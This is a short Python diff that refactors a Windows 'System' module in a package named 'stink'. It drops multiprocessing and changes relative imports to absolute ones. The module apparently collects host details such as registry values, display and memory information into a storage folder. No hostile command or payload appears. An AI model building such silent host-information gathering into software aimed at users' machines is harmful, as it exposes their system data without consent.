@@ -1,20 +1,18 @@
 import platform
 from os import mkdir, path
 from string import ascii_uppercase
-from multiprocessing import Process
 from urllib.request import Request, urlopen
 from ctypes import windll, sizeof, byref, c_wchar_p
 from winreg import OpenKey, QueryValueEx, HKEY_LOCAL_MACHINE
 
-from ..helpers import functions
-from ..helpers.config import SystemConfig
-from ..helpers import DisplayDevice, MemoryStatusEx, UlargeInteger
+from stink.helpers import functions
+from stink.helpers.config import SystemConfig
+from stink.helpers import DisplayDevice, MemoryStatusEx, UlargeInteger
 
 
-class System(Process):
+class System:
 
     def __init__(self, storage_path: str, folder: str, errors: bool):
-        Process.__init__(self)
 
         self.config = SystemConfig()
         self.storage_path = storage_path
